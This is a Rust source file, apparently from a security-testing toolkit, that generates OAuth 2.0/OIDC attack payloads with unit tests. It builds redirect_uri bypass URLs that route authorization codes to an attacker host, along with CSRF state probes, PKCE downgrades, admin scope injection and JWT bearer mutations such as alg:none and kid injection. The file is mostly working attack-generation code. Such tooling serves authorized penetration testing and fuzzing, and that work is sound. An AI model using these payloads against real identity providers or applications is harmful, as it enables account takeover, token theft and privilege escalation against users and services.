//! OAuth 2.0 / OIDC attack library.
//!
//! Comprehensive coverage of every well-known validation bug in the OAuth 2.0
//! and OIDC ecosystem. Each function returns a concrete candidate set for the
//! caller's fuzzer / proxy replay loop. No network I/O; all functions are
//! deterministic and panic-safe for arbitrary inputs.
//!
//! Coverage map:
//!
//! | Class | Variants |
//! |---|---|
//! | redirect_uri bypass | 11 URL-confusion variants (userinfo, subdomain, path-prefix, fragment, percent-encoded dot, backslash, case-fold, port confusion, IP literal, localhost-alias, open-redirect chain) |
//! | state attacks | 5 CSRF / state-binding bugs |
//! | PKCE attacks | 4 PKCE downgrade / reuse / confusion bugs |
//! | scope attacks | 4 scope-injection / separator / upgrade bugs |
//! | token attacks | 3 token misuse / replay bugs |
//! | response_type/mode confusion | 2 hybrid-flow bugs |
//! | JWT bearer mutations | re-uses `jwt` module |

use crate::encoding::jwt;

// ── Public types ─────────────────────────────────────────────────────────────

/// A single OAuth attack variant ready for replay.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OauthVariant {
    /// Short identifier matching one of the attack classes in the doc table.
    pub attack_class: &'static str,
    /// The raw string payload (redirect_uri value, state value, scope string, …).
    pub payload: String,
    /// Human-readable explanation of what validation bug this exploits.
    pub description: String,
}

// ── redirect_uri attacks ──────────────────────────────────────────────────────

/// Returns every `redirect_uri` variant that is known to bypass substring
/// or prefix matchers.
///
/// # Arguments
/// * `trusted_host` — the host that the AS legitimately trusts (e.g. `"trusted.com"`).
/// * `attacker_host` — the attacker-controlled host (e.g. `"attacker.com"`).
///
/// # Panics
/// Never panics; inputs are used only in string formatting.
#[must_use]
pub fn redirect_uri_attacks(trusted_host: &str, attacker_host: &str) -> Vec<String> {
    // Strip any leading scheme so we can compose freely.
    let trusted = trusted_host
        .trim_start_matches("https://")
        .trim_start_matches("http://");
    let attacker = attacker_host
        .trim_start_matches("https://")
        .trim_start_matches("http://");

    vec![
        // 1. Userinfo confusion — `@` tricks substring matchers that look for
        //    the trusted host anywhere in the URL.
        format!("https://{}@{}/callback", trusted, attacker),
        // 2. Subdomain prefix — passes a "startsWith(trusted)" check when the
        //    trusted string is a bare host (not anchored).
        format!("https://{}.{}/callback", trusted, attacker),
        // 3. Path prefix — passes a "contains path" check on the wrong segment.
        format!("https://{}/{}/callback", attacker, trusted),
        // 4. Fragment confusion — fragment is ignored by some AS parsers.
        format!("https://{}#https://{}/callback", attacker, trusted),
        // 5. Percent-encoded dot — `%2e` is decoded after the comparison on
        //    servers that do a raw-string prefix match.
        format!(
            "https://{}%2e{}/callback",
            trusted.replace('.', "%2e"),
            attacker
        ),
        // 6. Backslash / parser disagreement — browsers normalise `\` to `/`
        //    in the authority delimiter; some AS parsers don't.
        format!("https://{}\\@{}/callback", trusted, attacker),
        // 7. Case folding — scheme and host are case-insensitive (RFC 3986)
        //    but many AS implementations do a case-sensitive strcmp.
        format!(
            "HTTPS://{}/callback",
            trusted.to_uppercase()
        ),
        // 8. Port confusion — `trusted:80` passes a prefix match for `trusted`
        //    and the `@` pushes the host over to the attacker.
        format!("https://{}:80@{}/callback", trusted, attacker),
        // 9. IP literal — the AS registers a hostname; an IP that resolves to
        //    the same address may bypass the comparison.
        format!("https://127.0.0.1/callback"),
        // 10. Localhost alias — `localhost.attacker` starts with `localhost`
        //     and is not the loopback address.
        format!("http://localhost.{}/callback", attacker),
        // 11. Open redirect chain in path — the AS validates the registered
        //     base path but doesn't follow the embedded `url=` parameter.
        format!(
            "https://{}/redirect?url=https://{}/callback",
            trusted, attacker
        ),
    ]
}

// ── state parameter attacks ───────────────────────────────────────────────────

/// Returns state parameter payloads that probe CSRF and state-binding flaws.
///
/// # Arguments
/// * `legitimate_state` — a real state value previously issued by the AS.
#[must_use]
pub fn state_attack_payloads(legitimate_state: &str) -> Vec<String> {
    vec![
        // 1. Missing state — CSRF: no state → AS should reject, many don't.
        String::new(),
        // 2. Predictable sequential state — often sequential integers or short
        //    random strings in misconfigured libraries.
        "1".to_owned(),
        // 3. Timestamp-based predictable state — seconds since epoch is guessable
        //    within the login window.
        "1716585600".to_owned(),
        // 4. State reuse — replaying a previously consumed state value. A correct
        //    AS invalidates state after first use; many don't.
        legitimate_state.to_owned(),
        // 5. Empty-string state — distinct from missing; some parsers treat ""
        //    as "present" and skip CSRF checks.
        "".to_owned(),
    ]
}

// ── PKCE attacks ──────────────────────────────────────────────────────────────

/// Returns (code_verifier, code_challenge_method) pairs for PKCE attack probes.
///
/// Each pair represents a manipulation that a server with correct PKCE support
/// should reject.
///
/// # Arguments
/// * `legitimate_verifier` — the real PKCE verifier for an in-flight request.
#[must_use]
pub fn pkce_attack_payloads(legitimate_verifier: &str) -> Vec<(String, String)> {
    vec![
        // 1. Downgrade S256 → plain (CVE-2020-26941 class): client registered
        //    with S256 but sends plain — some AS accept it because they don't
        //    store the registered method.
        (
            legitimate_verifier.to_owned(),
            "plain".to_owned(),
        ),
        // 2. Missing verifier — code_verifier omitted entirely at the token
        //    endpoint; correct AS must reject.
        (String::new(), "S256".to_owned()),
        // 3. Verifier reuse — same verifier submitted for two different auth
        //    codes; the second should fail.
        (legitimate_verifier.to_owned(), "S256".to_owned()),
        // 4. Challenge method confusion — "PLAIN" (uppercase) vs "plain"; some
        //    case-sensitive parsers treat these as unknown and skip validation.
        (
            legitimate_verifier.to_owned(),
            "PLAIN".to_owned(),
        ),
    ]
}

// ── scope attacks ─────────────────────────────────────────────────────────────

/// Returns scope strings that probe injection, separator confusion, and upgrade bugs.
///
/// # Arguments
/// * `registered_scopes` — the scopes the client actually registered (e.g. `["openid", "profile"]`).
#[must_use]
pub fn scope_attack_payloads(registered_scopes: &[&str]) -> Vec<String> {
    let base = registered_scopes.join(" ");
    vec![
        // 1. Scope upgrade injection — append a privileged scope beyond what
        //    was registered; a correct AS should strip or reject.
        format!("{} admin", base),
        // 2. Comma separator — RFC 6749 uses space; some AS also accept commas.
        //    Sending commas may produce a different (wider) token.
        registered_scopes.join(","),
        // 3. URL-encoded space — `%20` in the scope string; parsers that don't
        //    URL-decode before comparison see a single opaque token.
        registered_scopes
            .iter()
            .map(|s| s.replace(' ', "%20"))
            .collect::<Vec<_>>()
            .join("%20"),
        // 4. Scope downgrade then re-upgrade — send a narrow scope at consent
        //    time, then request the full scope at the token endpoint.
        format!("{} offline_access write:admin", base),
    ]
}

// ── token attacks ─────────────────────────────────────────────────────────────

/// Returns token-position payloads that probe misuse / replay bugs.
///
/// These are description strings (not executable payloads) because the actual
/// token values are operator-supplied at runtime. The caller should substitute
/// the correct token into the described position.
#[must_use]
pub fn token_attack_descriptions() -> Vec<(&'static str, &'static str)> {
    vec![
        (
            "access_token_in_fragment",
            "Send the access_token in the URL fragment (#access_token=…). \
             Logs, referrer headers, and browser history capture it.",
        ),
        (
            "refresh_token_replay_after_revocation",
            "Re-submit a refresh_token after the AS has issued a new one \
             (rotation). A correct AS must revoke the entire token family.",
        ),
        (
            "token_type_swap",
            "Present an access_token where a refresh_token is expected \
             and vice-versa. Many resource servers validate only the signature.",
        ),
    ]
}

// ── response_type / response_mode confusion ───────────────────────────────────

/// Returns (response_type, response_mode) pairs that probe hybrid-flow and
/// XSS-surface confusion.
#[must_use]
pub fn response_type_mode_attacks() -> Vec<(&'static str, &'static str)> {
    vec![
        // 1. Hybrid flow where backend expected code-only — `code id_token`
        //    causes some AS to include the id_token in the front-channel,
        //    exposing it to JS/referrer leakage.
        ("code id_token", "fragment"),
        // 2. form_post → query downgrade — switching response_mode from
        //    `form_post` to `query` changes the XSS surface from POST body
        //    (harder to exploit) to a reflected URL parameter.
        ("code", "query"),
    ]
}

// ── one-shot fan-out ──────────────────────────────────────────────────────────

/// Produces a complete OAuth / OIDC attack candidate set in one call.
///
/// # Arguments
/// * `trusted_host`      — host string the AS accepts (e.g. `"app.example.com"`).
/// * `attacker_host`     — attacker-controlled host.
/// * `registered_scopes` — scopes the client is registered for.
#[must_use]
pub fn all_oauth_attacks(
    trusted_host: &str,
    attacker_host: &str,
    registered_scopes: &[&str],
) -> Vec<OauthVariant> {
    let mut out: Vec<OauthVariant> = Vec::new();

    // redirect_uri variants
    for uri in redirect_uri_attacks(trusted_host, attacker_host) {
        out.push(OauthVariant {
            attack_class: "redirect_uri",
            description: format!(
                "redirect_uri bypass variant: {}",
                uri
            ),
            payload: uri,
        });
    }

    // state variants
    let dummy_state = "legitimate-state-abc123";
    for s in state_attack_payloads(dummy_state) {
        out.push(OauthVariant {
            attack_class: "state",
            description: format!("state attack payload: {:?}", s),
            payload: s,
        });
    }

    // PKCE variants
    let dummy_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
    for (verifier, method) in pkce_attack_payloads(dummy_verifier) {
        out.push(OauthVariant {
            attack_class: "pkce",
            description: format!(
                "PKCE attack — verifier={:?}, method={:?}",
                verifier, method
            ),
            payload: format!("{}:{}", verifier, method),
        });
    }

    // scope variants
    for scope in scope_attack_payloads(registered_scopes) {
        out.push(OauthVariant {
            attack_class: "scope",
            description: format!("scope attack: {:?}", scope),
            payload: scope,
        });
    }

    // token descriptions
    for (class, desc) in token_attack_descriptions() {
        out.push(OauthVariant {
            attack_class: "token",
            description: desc.to_owned(),
            payload: class.to_owned(),
        });
    }

    // response_type / response_mode
    for (rt, rm) in response_type_mode_attacks() {
        out.push(OauthVariant {
            attack_class: "response_type_mode",
            description: format!(
                "response_type={:?} response_mode={:?} confusion",
                rt, rm
            ),
            payload: format!("{}+{}", rt, rm),
        });
    }

    out
}

// ── JWT bearer relay ──────────────────────────────────────────────────────────

/// Applies every JWT mutation from the `jwt` module to a bearer token and
/// returns the results as `OauthVariant` entries.
///
/// The caller captures a real bearer token from a flow and feeds it here to
/// get the full JWT confusion / alg-none / kid-traversal fan-out.
#[must_use]
pub fn jwt_bearer_attacks(bearer_token: &str) -> Vec<OauthVariant> {
    let mut out = Vec::new();

    // alg:none family — returns multiple variants
    for mutated in jwt::alg_none_family(bearer_token) {
        out.push(OauthVariant {
            attack_class: "jwt_alg_none",
            description: "alg:none variant on OAuth bearer token".to_owned(),
            payload: mutated,
        });
    }

    // HS256 and RS256 algorithm confusion
    for (class, result) in [
        ("jwt_alg_confusion_hs256", jwt::alg_confusion_hs256(bearer_token)),
        ("jwt_alg_confusion_rs256", jwt::alg_confusion_rs256(bearer_token)),
        ("jwt_empty_signature", jwt::empty_signature(bearer_token)),
        ("jwt_crit_bypass", jwt::crit_bypass(bearer_token)),
    ] {
        if let Some(mutated) = result {
            out.push(OauthVariant {
                attack_class: class,
                description: format!(
                    "JWT bearer mutation via {} applied to OAuth bearer token",
                    class
                ),
                payload: mutated,
            });
        }
    }

    // kid attacks — returns multiple variants (path traversal, SQLi, cmd inj, log4shell)
    for mutated in jwt::kid_attacks(bearer_token) {
        out.push(OauthVariant {
            attack_class: "jwt_kid_attack",
            description: "JWT kid manipulation on OAuth bearer token".to_owned(),
            payload: mutated,
        });
    }

    // b64 padding variants
    for mutated in jwt::b64_padding_variants(bearer_token) {
        out.push(OauthVariant {
            attack_class: "jwt_b64_padding",
            description: "JWT b64 padding trick on OAuth bearer token".to_owned(),
            payload: mutated,
        });
    }

    // duplicate alg header — HS256 first-wins vs last-wins confusion
    if let Some(mutated) = jwt::duplicate_alg_header(bearer_token, "HS256", "none") {
        out.push(OauthVariant {
            attack_class: "jwt_duplicate_alg",
            description: "JWT duplicate alg header confusion on OAuth bearer token".to_owned(),
            payload: mutated,
        });
    }

    out
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── redirect_uri ──────────────────────────────────────────────────────────

    #[test]
    fn redirect_uri_returns_11_variants() {
        let uris = redirect_uri_attacks("trusted.com", "attacker.com");
        assert_eq!(uris.len(), 11, "expected exactly 11 redirect_uri variants");
    }

    #[test]
    fn redirect_uri_userinfo_contains_attacker() {
        let uris = redirect_uri_attacks("trusted.com", "attacker.com");
        // variant 0 is userinfo confusion
        assert!(
            uris[0].contains("attacker.com"),
            "userinfo variant must route to attacker"
        );
        assert!(
            uris[0].contains("trusted.com"),
            "userinfo variant must embed trusted in userinfo"
        );
    }

    #[test]
    fn redirect_uri_subdomain_prefix() {
        let uris = redirect_uri_attacks("trusted.com", "attacker.com");
        // variant 1: trusted.com.attacker.com
        assert!(uris[1].starts_with("https://trusted.com.attacker.com"));
    }

    #[test]
    fn redirect_uri_backslash_present() {
        let uris = redirect_uri_attacks("trusted.com", "attacker.com");
        // variant 5 is the backslash one
        assert!(uris[5].contains('\\'), "backslash variant must contain backslash");
    }

    #[test]
    fn redirect_uri_case_fold_uppercase() {
        let uris = redirect_uri_attacks("trusted.com", "attacker.com");
        // variant 6 is case-folded
        assert!(uris[6].starts_with("HTTPS://"), "case-fold variant must start with HTTPS://");
    }

    #[test]
    fn redirect_uri_no_panic_on_huge_input() {
        let big = "a".repeat(10_000);
        let uris = redirect_uri_attacks(&big, "attacker.com");
        assert_eq!(uris.len(), 11);
    }

    #[test]
    fn redirect_uri_no_panic_on_crlf_null() {
        let evil = "trusted\r\n\0.com";
        let uris = redirect_uri_attacks(evil, "attacker\r\n\0.com");
        assert_eq!(uris.len(), 11);
    }

    #[test]
    fn redirect_uri_deterministic() {
        let a = redirect_uri_attacks("trusted.com", "evil.io");
        let b = redirect_uri_attacks("trusted.com", "evil.io");
        assert_eq!(a, b);
    }

    // ── state ─────────────────────────────────────────────────────────────────

    #[test]
    fn state_payloads_count() {
        let payloads = state_attack_payloads("abc123");
        assert_eq!(payloads.len(), 5);
    }

    #[test]
    fn state_contains_empty_string() {
        let payloads = state_attack_payloads("abc123");
        assert!(
            payloads.iter().any(|p| p.is_empty()),
            "must include empty-string state"
        );
    }

    #[test]
    fn state_includes_legitimate_value() {
        let legit = "my-state-token-xyz";
        let payloads = state_attack_payloads(legit);
        assert!(
            payloads.iter().any(|p| p == legit),
            "must include the legitimate state for replay"
        );
    }

    // ── PKCE ──────────────────────────────────────────────────────────────────

    #[test]
    fn pkce_returns_4_pairs() {
        let pairs = pkce_attack_payloads("verifier-abc");
        assert_eq!(pairs.len(), 4);
    }

    #[test]
    fn pkce_downgrade_uses_plain() {
        let pairs = pkce_attack_payloads("verifier-abc");
        assert_eq!(pairs[0].1, "plain", "first variant must downgrade to plain");
    }

    #[test]
    fn pkce_missing_verifier_is_empty() {
        let pairs = pkce_attack_payloads("verifier-abc");
        assert!(pairs[1].0.is_empty(), "second variant must have empty verifier");
    }

    #[test]
    fn pkce_deterministic() {
        let a = pkce_attack_payloads("v1");
        let b = pkce_attack_payloads("v1");
        assert_eq!(a, b);
    }

    // ── scope ─────────────────────────────────────────────────────────────────

    #[test]
    fn scope_returns_4_variants() {
        let scopes = scope_attack_payloads(&["openid", "profile"]);
        assert_eq!(scopes.len(), 4);
    }

    #[test]
    fn scope_upgrade_contains_admin() {
        let scopes = scope_attack_payloads(&["openid", "profile"]);
        assert!(scopes[0].contains("admin"), "first variant must inject admin scope");
    }

    #[test]
    fn scope_comma_separator() {
        let scopes = scope_attack_payloads(&["openid", "profile"]);
        assert!(scopes[1].contains(','), "second variant must use comma separator");
    }

    #[test]
    fn scope_url_encoded_space() {
        let scopes = scope_attack_payloads(&["openid", "profile"]);
        assert!(scopes[2].contains("%20"), "third variant must use %20");
    }

    #[test]
    fn scope_empty_input_no_panic() {
        let scopes = scope_attack_payloads(&[]);
        assert_eq!(scopes.len(), 4);
    }

    // ── all_oauth_attacks ─────────────────────────────────────────────────────

    #[test]
    fn all_oauth_attacks_covers_all_classes() {
        let variants = all_oauth_attacks("app.example.com", "evil.io", &["openid", "profile"]);
        let classes: std::collections::HashSet<&str> =
            variants.iter().map(|v| v.attack_class).collect();
        for expected in &["redirect_uri", "state", "pkce", "scope", "token", "response_type_mode"] {
            assert!(
                classes.contains(expected),
                "missing attack class: {}",
                expected
            );
        }
    }

    #[test]
    fn all_oauth_attacks_minimum_count() {
        let variants = all_oauth_attacks("app.example.com", "evil.io", &["openid"]);
        // 11 + 5 + 4 + 4 + 3 + 2 = 29 minimum
        assert!(
            variants.len() >= 29,
            "expected at least 29 variants, got {}",
            variants.len()
        );
    }

    #[test]
    fn all_oauth_attacks_deterministic() {
        let a = all_oauth_attacks("trusted.com", "evil.io", &["openid", "email"]);
        let b = all_oauth_attacks("trusted.com", "evil.io", &["openid", "email"]);
        assert_eq!(a, b);
    }

    #[test]
    fn all_oauth_attacks_no_panic_empty_scopes() {
        let v = all_oauth_attacks("t.com", "a.com", &[]);
        assert!(!v.is_empty());
    }

    // ── token descriptions ────────────────────────────────────────────────────

    #[test]
    fn token_attack_descriptions_count() {
        assert_eq!(token_attack_descriptions().len(), 3);
    }

    // ── response_type / response_mode ─────────────────────────────────────────

    #[test]
    fn response_type_mode_attacks_count() {
        assert_eq!(response_type_mode_attacks().len(), 2);
    }

    #[test]
    fn response_type_mode_hybrid_flow_present() {
        let pairs = response_type_mode_attacks();
        assert!(
            pairs.iter().any(|(rt, _)| rt.contains("id_token")),
            "hybrid flow variant must be present"
        );
    }
}
